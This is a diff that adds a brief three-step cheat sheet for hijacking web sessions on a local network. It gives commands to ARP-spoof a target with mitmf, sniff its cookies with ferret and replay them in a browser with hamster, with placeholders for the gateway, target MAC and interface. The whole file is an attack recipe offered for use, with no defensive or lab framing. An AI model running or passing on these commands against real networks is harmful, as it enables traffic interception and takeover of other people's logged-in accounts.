@@ -1,0 +1,8 @@
+section 1 - Spoof:
+> mitmf --arp --spoof --gateway [AP IP] --target [tg MAC] -i [INTERFACE]
+
+section 2 - Get Cookies from spoof:
+> ferret -i [INTERFACE]
+
+section 3 - Eat your cookies on your browser:
+> hamster
